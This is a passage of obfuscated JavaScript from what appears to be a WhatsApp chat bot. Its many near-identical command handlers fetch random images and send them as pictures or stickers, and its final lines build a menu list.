`${_0x2363[258]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[259]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[260]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[261]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[262]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[263]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,sticker,{quoted:fdoc,contextInfo:{"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true},sendEphemeral:true})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[264]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[265]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,sticker,{quoted:fdoc,contextInfo:{"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true},sendEphemeral:true})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[266]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[267]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,sticker,{quoted:fdoc,contextInfo:{"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true},sendEphemeral:true})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[268]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[269]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,sticker,{quoted:fdoc,contextInfo:{"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true},sendEphemeral:true})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[270]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[271]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,sticker,{quoted:fdoc,contextInfo:{"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true},sendEphemeral:true})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[272]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[273]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,sticker,{quoted:fdoc,contextInfo:{"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true},sendEphemeral:true})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[274]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[275]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,sticker,{quoted:fdoc,contextInfo:{"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true},sendEphemeral:true})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[276]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[277]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,sticker,{quoted:fdoc,contextInfo:{"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true},sendEphemeral:true})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[278]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[279]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,sticker,{quoted:fdoc,contextInfo:{"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true},sendEphemeral:true})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[280]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[281]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,sticker,{quoted:fdoc,contextInfo:{"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true},sendEphemeral:true})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[282]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[283]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,sticker,{quoted:fdoc,contextInfo:{"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true},sendEphemeral:true})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[284]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[285]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,sticker,{quoted:fdoc,contextInfo:{"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true},sendEphemeral:true})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[286]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[287]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,sticker,{quoted:fdoc,contextInfo:{"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true},sendEphemeral:true})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[288]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[289]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,sticker,{quoted:fdoc,contextInfo:{"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true},sendEphemeral:true})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[290]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[291]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,sticker,{quoted:fdoc,contextInfo:{"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true},sendEphemeral:true})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[292]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[293]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,sticker,{quoted:fdoc,contextInfo:{"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true},sendEphemeral:true})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[294]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[295]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,sticker,{quoted:fdoc,contextInfo:{"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true},sendEphemeral:true})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[296]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[297]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,sticker,{quoted:fdoc,contextInfo:{"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true},sendEphemeral:true})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[298]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[299]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,sticker,{quoted:fdoc,contextInfo:{"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true},sendEphemeral:true})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[300]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[301]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,sticker,{quoted:fdoc,contextInfo:{"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true},sendEphemeral:true})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[302]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[303]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,sticker,{quoted:fdoc,contextInfo:{"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true},sendEphemeral:true})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};subscribezeeoneofc= (type== _0x2363[304])?mek[_0x2363[1]][_0x2363[304]][_0x2363[305]]:_0x2363[4];let R=fs[_0x2363[5]](`${_0x2363[3]}${thumbnail}${_0x2363[4]}`);let Y=fs[_0x2363[5]](`${_0x2363[3]}${thumbnail}${_0x2363[4]}`);let N=fs[_0x2363[5]](`${_0x2363[3]}${thumbnail}${_0x2363[4]}`);if(subscribezeeoneofc== _0x2363[21]){let pip=alpha[_0x2363[152]](from,{"\x6C\x69\x73\x74\x4D\x65\x73\x73\x61\x67\x65":{"\x74\x69\x74\x6C\x65":`${_0x2363[4]}${hahh}${_0x2363[33]}${pushname}${_0x2363[4]}`,"\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E":`${_0x2363[306]}`,"\x62\x75\x74\x74\x6F\x6E\x54\x65\x78\x74":_0x2363[307],"\x66\x6F\x6F\x74\x65\x72\x54\x65\x78\x74":`${_0x2363[4]}${creator}${_0x2363[4]}`,"\x6C\x69\x73\x74\x54\x79\x70\x65":_0x2363[308],"\x73\x65\x63\x74\x69\x6F\x6E\x73":[{"\x74\x69\x74\x6C\x65":_0x2363[309],"\x72\x6F\x77\x73":[{"\x74\x69\x74\x6C\x65":_0x2363[154],"\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E":_0x2363[310],"\x72\x6F\x77\x49\x64":_0x2363[154]}]},{"\x74\x69\x74\x6C\x65":_0x2363[311],"\x72\x6F\x77\x73":[{"\x74\x69\x74\x6C\x65":_0x2363[155],"\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E":_0x2363[312],"\x72\x6F\x77\x49\x64":_0x2363[313]}]},{"\x74\x69\x74\x6C\x65":_0x2363[314],"\x72\x6F\x77\x73":[{"\x74\x69\x74\x6C\x65":_0x2363[143],"\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E":_0x2363[315],"\x72\x6F\x77\x49\x64":_0x2363[313]}]},{"\x74\x69\x74\x6C\x65":_0x2363[316],"\x72\x6F\x77\x73":[{"\x74\x69\x74\x6C\x65":_0x2363[156],"\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E":_0x2363[317],"\x72\x6F\x77\x49\x64":_0x2363[313]}]},{"\x74\x69\x74\x6C\x65":_0x2363[318],"\x72\x6F\x77\x73":[{"\x74\x69\x74\x6C\x65":_0x2363[157],"\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E":_0x2363[319],"\x72\x6F\x77\x49\x64":_0x2363[313]}]},{"\x74\x69\x74\x6C\x65":_0x2363[320],"\x72\x6F\x77\x73":[{"\x74\x69\x74\x6C\x65":_0x2363[158],"\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E":_0x2363[321],"\x72\x6F\x77\x49\x64":_0x2363[313]}]},{"\x74\x69\x74\x6C\x65":_0x2363[322],"\x72\x6F\x77\x73":[{"\x74\x69\x74\x6C\x65":_0x2363[159],"\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E":_0x2363[323],"\x72\x6F\x77\x49\x64":_0x2363[313]}]},{"\x74\x69\x74\x6C\x65":_0x2363[324],"\x72\x6F\x77\x73":[{"\x74\x69\x74\x6C\x65":_0x2363[160],"\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E":_0x2363[325],"\x72\x6F\x77\x49\x64":_0x2363[313]}]},{"\x74\x69\x74\x6C\x65":_0x2363[326],"\x72\x6F\x77\x73":[{"\x74\x69\x74\x6C\x65":_0x2363[161],"\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E":_0x2363[327],"\x72\x6F\x77\x49\x64":_0x2363[313]}]},{"\x74\x69\x74\x6C\x65":_0x2363[328],"\x72\x6F\x77\x73":[{"\x74\x69\x74\x6C\x65":_0x2363[162],"\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E":_0x2363[329],"\x72\x6F\x77\x49\x64":_0x2363[313]}]},{"\x74\x69\x74\x6C\x65":_0x2363[330],"\x72\x6F\x77\x73":[{"\x74\x69\x74\x6C\x65":_0x2363[163],"\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E":_0x2363[331],"\x72\x6F\x77\x49\x64":_0x2363[313]}]},{"\x74\x69\x74\x6C\x65":_0x2363[332],"\x72\x6F\x77\x73":[{"\x74\x69\x74\x6C\x65":_0x2363[164],"\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E":_0x2363[333],"\x72\x6F\x77\x49\x64":_0x2363[313]}]},{"\x74\x69\x74\x6C\x65":_0x2363[334],"\x72\x6F\x77\x73":[{"\x74\x69\x74\x6C\x65":_0x2363[165],"\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E":_0x2363[335],"\x72\x6F\x77\x49\x64":_0x2363[313]}]},{"\x74\x69\x74\x6C\x65":_0x2363[336],"\x72\x6F\x77\x73":[{"\x74\x69\x74\x6C\x65":_0x2363[166],"\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E":_0x2363[337],"\x72\x6F\x77\x49\x64":_0x2363[313]}]},{"\x74\x69\x74\x6C\x65":_0x2363[338],"\x72\x6F\x77\x73":[{"\x74\x69\x74\x6C\x65":_0x2363[167],"\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E":_0x2363[339],"\x72\x6F\x77\x49\x64":_0x2363[167]}]},{"\x74\x69\x74\x6C\x65":_0x2363[340],"\x72\x6F\x77\x73":[{"\x74\x69\x74\x6C\x65":_0x2363[180],"\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E":_0x2363[341],"\x72\x6F\x77\x49\x64":_0x2363[313]}]}]}},{});alpha[_0x2363[153]](pip,{waitForAck:true})};if(subscribezeeoneofc== _0x2363[23]){var imgList=[_0x2363[168],_0x2363[169],_0x2363[170],_0x2363[171],_0x2363[172],_0x2363[173],_0x2363[174]];var imgUrl=imgList[Math[_0x2363[176]](Math[_0x2363[175]]()* imgList[_0x2363[43]])];ini_mark= `${_0x2363[4]}${ownerNumber}${_0x2363[342]}`;tqto= `${_0x2363[343]}${ini_mark[_0x2363[81]](_0x2363[182])[0]}${_0x2363[4]}`;alpha[_0x2363[10]](from,tqto,text,{thumbnail:fs[_0x2363[5]](`${_0x2363[3]}${thumbnail}${_0x2363[4]}`),caption:_0x2363[183],"\x63\x6F\x6E\x74\x65\x78\x74\x49\x6E\x66\x6F":{text:_0x2363[183],"\x6D\x65\x6E\x74\x69\x6F\x6E\x65\x64\x4A\x69\x64":[ini_mark],"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":1000000000,isForwarded:true,sendEphemeral:true,"\x65\x78\x74\x65\x72\x6E\x61\x6C\x41\x64\x52\x65\x70\x6C\x79":{"\x74\x69\x74\x6C\x65":`${_0x2363[4]}${hahh}${_0x2363[33]}${pushname}${_0x2363[4]}`,"\x62\x6F\x64\x79":`${_0x2363[178]}`,"\x70\x72\x65\x76\x69\x65\x77\x54\x79\x70\x65":_0x2363[34],"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C\x55\x72\x6C":`${_0x2363[4]}${imgUrl}${_0x2363[4]}`,"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C":_0x2363[4],"\x73\x6F\x75\x72\x63\x65\x55\x72\x6C":`${_0x2363[179]}`}},quoted:ftoko})};if(subscribezeeoneofc== 